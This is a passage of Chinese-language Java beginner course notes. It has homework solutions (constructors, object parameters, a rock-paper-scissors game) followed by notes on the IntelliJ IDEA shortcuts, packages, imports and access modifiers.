age;<br>&#125;<br><span class="hljs-comment">//姓名、性别、年龄、职位、薪水</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">(String name,<span class="hljs-type">char</span> gender,<span class="hljs-type">int</span> age,String job,<span class="hljs-type">double</span> sal)</span>&#123;<br><span class="hljs-built_in">this</span>(name,gender,age); <span class="hljs-comment">//使用到前面的构造器</span><br><span class="hljs-comment">// this(job,sal); //该句错误，如果要在一个构造器，访问另外一个构造器，该语句必须放在第一条语句</span><br><span class="hljs-built_in">this</span>.job = job;<br><span class="hljs-built_in">this</span>.sal = sal;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>13.将对象作为参数传递给方法。Homework13.java<br>题目要求:<br>（1）定义一个Circle类，包含一个double型的radius属性代表圆的半径，findArea（）方法返回圆的面积。<br>（2） 定义一个类PassObject，在类中定义一个方法printAreas（），该方法的定义如下： public void printAreas（Circle c， int times）／&#x2F;方法签名<br>（3）在printAreas方法中打印输出1到times之间的每个整数半径值，以及对应的面积。例如，times为5，则输出半径1，2，3，4，5，以及对应的圆面积。<br>（4）在main方法中调用printAreas（）方法，调用完毕后输出当前半径值。程序运行结果如图所示</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220913150410796.png" alt="image-20220913150410796" style="zoom:50%;" /></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework13</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-type">Circle</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>();<br><span class="hljs-type">PassObject</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PassObject</span>();<br>p.printAreas(c,<span class="hljs-number">5</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span>&#123;<br><span class="hljs-type">double</span> radius;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Circle</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//无参构造器</span><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">Circle</span><span class="hljs-params">(<span class="hljs-type">double</span> radius)</span>&#123;<br><span class="hljs-built_in">this</span>.radius = radius;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">findArea</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> radius*radius*Math.PI;<br>&#125;<br><span class="hljs-comment">//添加一个修改对象半径值的方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRadius</span><span class="hljs-params">(<span class="hljs-type">double</span> radius)</span>&#123;<br><span class="hljs-built_in">this</span>.radius = radius;<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PassObject</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printAreas</span><span class="hljs-params">(Circle c,<span class="hljs-type">int</span> times)</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;Radius\tArea&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=times;i++)&#123;<br>c.setRadius(i);<br>System.out.println((<span class="hljs-type">double</span>)i+<span class="hljs-string">&quot;\t&quot;</span>+c.findArea());<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><ol start="14"><li><p>扩展题</p><p>有个人Tom 设计他的成员变量.成员方法，可以电脑猜拳.<br>电脑每次都会随机生成0，1，2<br>0 表示 石头 1 表示剪刀 2 表示 布<br>并要可以显示 Tom的输赢次数（清单）</p></li></ol></blockquote><p>简易版：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework14</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//创建一个玩家对象</span><br><span class="hljs-type">T</span> <span class="hljs-variable">tom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">T</span>();<br>tom.play(<span class="hljs-number">3</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>&#123;<br><span class="hljs-type">int</span> guess; <span class="hljs-comment">//猜拳的数</span><br><span class="hljs-type">int</span> AInum; <span class="hljs-comment">//ai出拳</span><br><span class="hljs-type">int</span> win; <span class="hljs-comment">//输赢次数</span><br><span class="hljs-type">int</span> count; <span class="hljs-comment">//比赛次数</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">(<span class="hljs-type">int</span> count)</span>&#123;<br><span class="hljs-type">Random</span> <span class="hljs-variable">rd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;count;i++) &#123;<br>System.out.println(<span class="hljs-string">&quot;请输入要出的拳（0：石头，1：剪刀，2：布）：&quot;</span>);<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>guess = myScanner.nextInt();<br>AInum = rd.nextInt(<span class="hljs-number">3</span>);<br>System.out.println(<span class="hljs-string">&quot;you:&quot;</span>+guess+<span class="hljs-string">&quot;ai:&quot;</span>+AInum);<br>judge();<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;猜拳胜利的次数为：&quot;</span>+win);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">judge</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">if</span> ((guess==<span class="hljs-number">0</span>&amp;&amp;AInum==<span class="hljs-number">1</span>)||(guess==<span class="hljs-number">1</span>&amp;&amp;AInum==<span class="hljs-number">2</span>)||(guess==<span class="hljs-number">2</span>&amp;&amp;AInum==<span class="hljs-number">0</span>)) &#123;<br>System.out.println(<span class="hljs-string">&quot;你赢了！&quot;</span>);<br>win++;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(guess==AInum)&#123;<br>System.out.println(<span class="hljs-string">&quot;平局！&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>System.out.println(<span class="hljs-string">&quot;你输了！&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>韩老师完整版：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">import</span> java.util.Random;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework14</span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//创建一个玩家对象</span><br><span class="hljs-type">Tom</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Tom</span>();<br><span class="hljs-comment">//记录最后输赢的次数</span><br><span class="hljs-type">int</span> <span class="hljs-variable">isWinCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">//二维数组，接收局数</span><br><span class="hljs-type">int</span>[][] arr1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>][<span class="hljs-number">3</span>];<br><span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-comment">//创建一个一维数组，用来接受输赢情况</span><br>String[] arr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">3</span>];<br><br><span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">3</span>;i++) &#123;<br><span class="hljs-comment">//玩家出拳</span><br>System.out.println(<span class="hljs-string">&quot;请输入要出的拳（0：石头，1：剪刀，2：布）：&quot;</span>);<br><span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> scanner.nextInt();<br>t.setTomGuessNum(num);<br><span class="hljs-type">int</span> <span class="hljs-variable">tomGuess</span> <span class="hljs-operator">=</span> t.getTomGuessNum();<br>arr1[i][j+<span class="hljs-number">1</span>]=tomGuess;<br><br><span class="hljs-comment">//电脑出拳</span><br><span class="hljs-type">int</span> <span class="hljs-variable">comGuess</span> <span class="hljs-operator">=</span> t.computerNum();<br>arr1[i][j+<span class="hljs-number">2</span>] = comGuess;<br><br><span class="hljs-comment">//比较</span><br><span class="hljs-type">String</span> <span class="hljs-variable">isWin</span> <span class="hljs-operator">=</span> t.vsComputer();<br>arr2[i] = isWin;<br>arr1[i][j] = t.count;<br><br><span class="hljs-comment">//对每一局进行输出</span><br>System.out.println(<span class="hljs-string">&quot;======================&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;局数\t玩家的出拳\t电脑的出拳\t输赢情况&quot;</span>);<br>System.out.print(t.count + <span class="hljs-string">&quot;\t&quot;</span> + tomGuess +<span class="hljs-string">&quot;\t\t&quot;</span> + comGuess + <span class="hljs-string">&quot;\t\t\n&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;======================&quot;</span>);<br>System.out.println(<span class="hljs-string">&quot;\n\n&quot;</span>);<br>isWinCount = t.winCount(isWin);<br>&#125;<br><span class="hljs-comment">//最终结果</span><br>System.out.println(<span class="hljs-string">&quot;局数\t玩家的出拳\t电脑的出拳\t\t输赢情况&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;a&lt;arr1.length;a++) &#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> b=<span class="hljs-number">0</span>;b&lt;arr1[a].length;b++) &#123;<br>System.out.print(arr1[a][b]+<span class="hljs-string">&quot;\t\t\t&quot;</span>);<br>&#125;<br>System.out.print(arr2[a]);<br>System.out.println();<br>&#125;<br>System.out.println(<span class="hljs-string">&quot;你赢了&quot;</span>+isWinCount+<span class="hljs-string">&quot;次&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Tom</span>&#123;<br><span class="hljs-comment">//玩家出拳</span><br><span class="hljs-type">int</span> tomGuessNum;<br><span class="hljs-comment">//电脑出拳</span><br><span class="hljs-type">int</span> comGuessNum;<br><span class="hljs-comment">//玩家胜利次数</span><br><span class="hljs-type">int</span> winCountNum;<br><span class="hljs-comment">//比赛的次数</span><br><span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showInfo</span><span class="hljs-params">()</span>&#123;<br><br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 电脑随机生成猜拳数组</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">computerNum</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">Random</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>comGuessNum = r.nextInt(<span class="hljs-number">3</span>); <span class="hljs-comment">//返回0-2的随机数</span><br><span class="hljs-keyword">return</span> comGuessNum;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 设置玩家猜拳的方法</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> tomGuessNum</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTomGuessNum</span><span class="hljs-params">(<span class="hljs-type">int</span> tomGuessNum)</span>&#123;<br><span class="hljs-keyword">if</span> (tomGuessNum&gt;<span class="hljs-number">2</span>||tomGuessNum&lt;<span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;数字输入错误。&quot;</span>);<span class="hljs-comment">//抛出一个异常</span><br>&#125;<br><span class="hljs-built_in">this</span>.tomGuessNum = tomGuessNum;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getTomGuessNum</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> tomGuessNum;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 比较猜拳的结果</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 赢为true，否则返回false</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">vsComputer</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">if</span> ((tomGuessNum==<span class="hljs-number">0</span>&amp;&amp;comGuessNum==<span class="hljs-number">1</span>)||(tomGuessNum==<span class="hljs-number">1</span>&amp;&amp;comGuessNum==<span class="hljs-number">2</span>)||(tomGuessNum==<span class="hljs-number">2</span>&amp;&amp;comGuessNum==<span class="hljs-number">0</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你赢了&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(tomGuessNum==comGuessNum)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;平局&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你输了&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 比较玩家赢的次数</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 赢为true，否则返回false</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">winCount</span><span class="hljs-params">(String s)</span>&#123;<br>count++;<br><span class="hljs-keyword">if</span> (s.equals(<span class="hljs-string">&quot;你赢了&quot;</span>)) &#123;<br>winCountNum++;<br>&#125;<br><span class="hljs-keyword">return</span> winCountNum;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="章节七-八"><a href="#章节七-八" class="headerlink" title="章节七-八"></a>章节七-八</h1><h2 id="1-IDEA简介及简单使用"><a href="#1-IDEA简介及简单使用" class="headerlink" title="1.IDEA简介及简单使用"></a>1.IDEA简介及简单使用</h2><p>IDE(集成开发环境)——IDEA</p><ol><li>IDEA全称 IntelliJ IDEA</li><li>在业界被公认为最好的Java开发工具</li><li>IDEA是JetBrains公司的产品，总部位于捷克的首都布拉格</li><li>除了支持Java开发，还支持HTML，CSS，PHP， MySQL， Python等</li></ol><p>Eclipse介绍</p><ol><li>Eclipse 是一个开放源代码的、基于Java的可扩展开发平台。</li><li>最初是由IBM公司耗资3000万美金开发的下一代IDE开发环境</li><li>2001年11月贡献给开源社区</li><li>Eclipse是目前最优秀的Java开发IDE之一</li></ol><p>创建类：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914102636642.png" alt="image-20220914102636642"></p><p>运行：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914102819688.png" alt="image-20220914102819688"></p><p>自动import包：</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914134424068.png" alt="image-20220914134424068"></p><p>alt+command+L 格式化代码</p><p>control+alt+I 缩进</p><p>⌃+R 快速运行</p><p>⌃+enter 快速生成构造器（win：alt+inert）</p><p>⌃+H 快速查看类层级</p><p>command+B 定位到方法（win：ctrl+B）</p><p>.var + Enter 自动分配变量名</p><p>⌘+⌥+T surround with</p><p>command+J 显示所有快捷键（win：ctrl+J）</p><p>init —— while(iterator.hasNext()){} iterator迭代器</p><p>I —— for (Object o :) {} 增强for</p><p><strong>模板快捷键</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">template</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//sout模板</span><br>        System.out.println(<span class="hljs-string">&quot;hi&quot;</span>);<br>        <span class="hljs-comment">//fori模板快捷键</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; ; i++) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>自定义模板：setting（preferences）-》editor-》live tempates</p><h2 id="2-包"><a href="#2-包" class="headerlink" title="2.包"></a>2.包</h2><p><strong>包的作用</strong></p><ol><li><p>区分相同名字的类</p></li><li><p>当类很多的时候，可以更好的管理</p></li><li><p>控制访问范围</p></li></ol><p><strong>包基本语法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hespedu;<br></code></pre></td></tr></table></figure><ol><li>package 关键字，表示打包</li><li>com.hspedu:表示包名</li></ol><p><strong>包的命名规则</strong></p><p>只能包含数字、字母、下划线、小圆点。不能用数字开头，不能是关键字或保留字。</p><p><strong>规范命名：小写字母+小圆点</strong></p><p>（例com.公司名.项目名.业务模块名[com.hspedu.oa.model;]）</p><h3 id="包的本质（原理）"><a href="#包的本质（原理）" class="headerlink" title="包的本质（原理）"></a><strong>包的本质（原理）</strong></h3><p>创建不同的文件夹来保存类文件。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914145206215.png" alt="image-20220914145206215" style="zoom:50%;" /><p>新建一个包com.xiaoming:</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914145413649.png" alt="image-20220914145413649" style="zoom:50%;" /><p>在文件夹中的样子：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914145435924.png" alt="image-20220914145435924" style="zoom:50%;" /><p>再创建一个com.xiaoqiang。</p><p>在两个包内都创建Dog类。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914145712586.png" alt="image-20220914145712586" style="zoom:50%;" /><p>创建use包及Test类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> use;<br><br><span class="hljs-keyword">import</span> com.xiaoqiang.Dog;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//小强的dog</span><br>        <span class="hljs-type">Dog</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();<br>        System.out.println(dog);<br>        <span class="hljs-comment">//小明的dog，用包名区分</span><br>        com.xiaoming.<span class="hljs-type">Dog</span> <span class="hljs-variable">dog1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.xiaoming.Dog();<br>        System.out.println(dog1);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914152044536.png" alt="image-20220914152044536" style="zoom:50%;" /><h3 id="常用的包"><a href="#常用的包" class="headerlink" title="常用的包"></a>常用的包</h3><ul><li>java.lang.*  &#x2F;&#x2F;基本包，默认引入</li><li>java.util.*&#x2F;&#x2F;util包，系统提供的工具包，工具类，使用Scanner</li><li>java.net.*    &#x2F;&#x2F;网络包，网络开发</li><li>java.awt.*   &#x2F;&#x2F;java的界面开发，GUI</li></ul><p><strong>包的引入（两种）</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//第一种，引入xx包下的指定类（推荐）</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-comment">//第二种，引入xx包下的所有类</span><br><span class="hljs-keyword">import</span> java.util.*;<br></code></pre></td></tr></table></figure><p>案例：使用系统提供的Arrays完成数组排序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.pkg;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Import01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr = &#123;-<span class="hljs-number">1</span>,<span class="hljs-number">20</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>&#125;;<br>        <span class="hljs-comment">//对其排序</span><br>        <span class="hljs-comment">//1.传统方法，自己编写排序（冒泡）</span><br>        <span class="hljs-comment">//2.系统提供了相关类，可以完成排序</span><br>        Arrays.sort(arr);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br>            System.out.print(arr[i]+<span class="hljs-string">&quot;\t&quot;</span>);<br>        &#125;<br>    &#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="注意事项和使用细节"><a href="#注意事项和使用细节" class="headerlink" title="注意事项和使用细节"></a>注意事项和使用细节</h3><ol><li>package的作用是声明当前类所在的包，<strong>需要放在类的最上面</strong>，一个类中<strong>最多只有一句package</strong></li><li>import指令 位置<strong>放在package的下面</strong>，在类定义前面，可以有多句且没有顺序要求要求</li></ol><h2 id="3-访问修饰符"><a href="#3-访问修饰符" class="headerlink" title="3.访问修饰符"></a>3.访问修饰符</h2><p>java提供四种访问修饰符号，用于控制方法和属性（成员变量）的访问权限（范围）</p><ol><li>公开级别：<strong>public</strong> 对外公开</li><li>受保护级别：<strong>protected</strong> 对子类和同一个包中的类公开</li><li>默认级别：<strong>没有修饰符号</strong>，向同一个包的类公开</li><li>私有级别：<strong>private</strong> 只有类本身可以访问，不对外公开</li></ol><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914164512303.png" alt="image-20220914164512303" style="zoom:50%;" /><p>举例：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220914170007648.png" alt="image-20220914170007648" style="zoom:50%;" /><p>modifier包下：</p><p>A.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.modifier;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123;<br>    <span class="hljs-comment">//四个属性</span><br>  